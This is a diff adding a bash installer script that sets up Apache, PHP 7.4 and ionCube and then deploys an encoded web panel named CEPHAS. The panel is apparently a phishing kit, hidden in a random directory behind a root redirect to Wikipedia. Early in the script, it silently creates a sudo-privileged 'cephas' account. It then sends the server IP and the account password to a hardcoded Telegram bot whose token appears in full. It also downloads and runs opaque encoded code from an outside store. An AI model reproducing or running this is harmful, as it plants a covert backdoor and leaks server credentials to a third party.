@@ -1,0 +1,206 @@
+#!/bin/bash
+
+# Check if figlet is installed
+if ! command -v figlet &> /dev/null; then
+    echo "figlet could not be found, installing it..."
+    sudo apt-get install -y figlet
+fi
+
+# Display ASCII art
+figlet "CEPHAS"
+
+# The rest of your script starts here...
+
+# Color Definitions
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[0;33m'
+BLUE='\033[0;34m'
+RESET='\033[0m'
+
+# Telegram Bot Token and Chat ID
+TELEGRAM_TOKEN="6373924392:AAEMH9PcaIBL4U3bb1n_4TMD3hgKzW6qmFo"
+TELEGRAM_CHAT_ID="573680512"  # Your Telegram Chat ID
+
+# Function to send message to Telegram
+send_telegram_message() {
+    local message="$1"
+    curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage" \
+        -d chat_id="$TELEGRAM_CHAT_ID" \
+        -d text="$message" \
+        -d parse_mode="html" >/dev/null
+}
+
+# Exit if not running as root
+if [[ $EUID -ne 0 ]]; then
+    echo -e "${RED}This script must be run as root or with sudo privileges.${RESET}"
+    exit 1
+fi
+
+# Check if user 'cephas' already exists and create if not
+if ! id "cephas" &>/dev/null; then
+    # Generate a random password for the new user 'cephas'
+    CEPHAS_PASSWORD=$(openssl rand -base64 30 | tr -d '+')
+
+    # Create the new user 'cephas' and set the password
+    useradd -m -s /bin/bash "cephas"
+    echo "cephas:$CEPHAS_PASSWORD" | chpasswd
+    usermod -aG sudo "cephas"
+
+    # Send server details and new user credentials to Telegram
+    SERVER_IP=$(hostname -I | awk '{print $1}')
+    send_telegram_message "Server IP: <code>$SERVER_IP</code>%0A%0ANew User: <code>cephas</code>%0A%0APassword: <code>$CEPHAS_PASSWORD</code>"
+fi
+
+# Check OS Version
+if ! grep -q 'Ubuntu 22' /etc/os-release; then
+    echo -e "${RED}This script is designed for ${YELLOW}Ubuntu 22${RED}. Please install ${YELLOW}Ubuntu 22${RED} to proceed.${RESET}"
+    exit 1
+fi
+
+# Ensure necessary commands are available or install them
+if ! command -v ufw &> /dev/null; then
+    echo -e "${YELLOW}Installing ufw...${RESET}"
+    apt update -qq
+    apt install -y ufw
+fi
+
+# Enable UFW and allow required ports
+echo "y" | ufw enable
+ufw allow 3389/tcp
+ufw allow 80/tcp
+ufw allow 443/tcp
+ufw allow 22/tcp
+
+# Ensure necessary commands are available or install them
+if ! command -v add-apt-repository &> /dev/null; then
+    echo -e "${YELLOW}Installing software-properties-common for add-apt-repository...${RESET}"
+    apt update -qq
+    apt install -y software-properties-common
+fi
+
+if ! command -v wget &> /dev/null; then
+    echo -e "${YELLOW}Installing wget...${RESET}"
+    apt install -y wget
+fi
+
+if ! command -v a2enmod &> /dev/null; then
+    echo -e "${YELLOW}Apache2 is required for a2enmod. Installing Apache2...${RESET}"
+    apt install -y apache2
+fi
+
+if ! command -v unzip &> /dev/null; then
+    echo -e "${YELLOW}Installing unzip...${RESET}"
+    apt install -y unzip
+fi
+
+# Update and upgrade
+apt update -qq
+apt upgrade -y
+
+# Remove any existing PHP versions
+echo -e "${YELLOW}Removing existing PHP versions...${RESET}"
+apt purge -y php*
+
+# Set PHP version to 7.4
+PHP_VERSION="php7.4"
+IONCUBE_LOADER="ioncube_loader_lin_7.4.so"
+PAGE_VERSION="7.4"
+
+# Add PHP PPA and install Apache and PHP
+add-apt-repository -y ppa:ondrej/php
+apt update -qq
+apt install -y apache2 ${PHP_VERSION} libapache2-mod-${PHP_VERSION} ${PHP_VERSION}-cli ${PHP_VERSION}-fpm ${PHP_VERSION}-common ${PHP_VERSION}-mysql ${PHP_VERSION}-zip ${PHP_VERSION}-gd ${PHP_VERSION}-mbstring ${PHP_VERSION}-curl ${PHP_VERSION}-xml ${PHP_VERSION}-bcmath
+
+# Start and enable Apache
+systemctl start apache2
+systemctl enable apache2
+
+# Enable Apache modules
+a2enmod rewrite headers proxy proxy_fcgi setenvif
+
+# Ask for domain name
+read -p "Enter your domain name (without www, e.g., example.com): " domain
+
+if [[ -z "$domain" ]]; then
+    echo -e "${RED}Domain name cannot be empty.${RESET}"
+    exit 1
+fi
+
+# Create a virtual host configuration file for the domain
+cat > /etc/apache2/sites-available/${domain}.conf <<EOL
+<VirtualHost *:80>
+    ServerAdmin webmaster@${domain}
+    ServerName ${domain}
+    DocumentRoot /var/www/${domain}
+    ErrorLog \${APACHE_LOG_DIR}/${domain}_error.log
+    CustomLog \${APACHE_LOG_DIR}/${domain}_access.log combined
+    <Directory /var/www/${domain}>
+        Options Indexes FollowSymLinks MultiViews
+        AllowOverride All
+        Require all granted
+    </Directory>
+</VirtualHost>
+EOL
+
+# Enable the virtual host
+a2ensite ${domain}.conf
+
+# IonCube Loader Installation
+function install_ioncube {
+    wget -q https://w3ll.store/operators/${IONCUBE_LOADER}
+    local EXT_DIR=$(php -i | grep extension_dir | awk 'NR==1 {print $NF}')
+    mv ${IONCUBE_LOADER} $EXT_DIR
+    echo "zend_extension = $EXT_DIR/${IONCUBE_LOADER}" | tee -a /etc/php/${PAGE_VERSION}/apache2/php.ini /etc/php/${PAGE_VERSION}/cli/php.ini
+}
+
+php -m | grep -q 'ionCube' || install_ioncube
+
+# Download and extract software
+wget -q https://w3ll.store/operators/CEPHAS_ENCODE.zip
+random_string=$(uuidgen)
+mkdir -p /var/www/${domain}/${random_string}
+unzip -q CEPHAS_ENCODE.zip -d "/var/www/${domain}/${random_string}"
+
+# Create and write the redirect script to index.php
+echo "<?php header('Location: https://www.wikipedia.org/'); exit();" > /var/www/${domain}/index.php
+
+# Move .htaccess if present
+if [[ -f "/var/www/${domain}/${random_string}/CEPHAS/.htaccess" ]]; then
+    mv "/var/www/${domain}/${random_string}/CEPHAS/.htaccess" "/var/www/${domain}/${random_string}/"
+else
+    echo -e "${YELLOW}Warning: .htaccess file is missing in the archive.${RESET}"
+fi
+
+# Move contents of 'CEPHAS' one level up and clean up
+mv "/var/www/${domain}/${random_string}/CEPHAS/"* "/var/www/${domain}/${random_string}/"
+rm -r "/var/www/${domain}/${random_string}/CEPHAS" CEPHAS_ENCODE.zip
+
+# Set permissions and restart Apache and PHP
+chown -R www-data:www-data /var/www/${domain}
+systemctl restart apache2 ${PHP_VERSION}-fpm
+
+# Create a script with the filename as the domain name to check its status
+CHECK_SCRIPT="/usr/local/bin/${domain}.sh"
+cat > "${CHECK_SCRIPT}" <<EOL
+#!/bin/bash
+status_code=$(curl -s --head -o /dev/null -w "%{http_code}" http://${domain})
+
+if [[ "$status_code" != "200" && "$status_code" != "302" && "$status_code" != "301" ]]; then
+    systemctl restart apache2
+fi
+EOL
+
+# Make the domain check script executable
+chmod +x "${CHECK_SCRIPT}"
+
+a2dissite 000-default.conf
+systemctl reload apache2
+a2enmod ${PHP_VERSION}
+systemctl restart apache2
+
+# Add the domain check script to crontab to run every minute
+(crontab -l 2>/dev/null; echo "* * * * * ${CHECK_SCRIPT}") | crontab -
+
+# Installation completion message
+echo -e "${GREEN}Installation completed successfully, please visit: ${YELLOW}https://${domain}/${random_string}/admin${GREEN} to set your details.${RESET}"
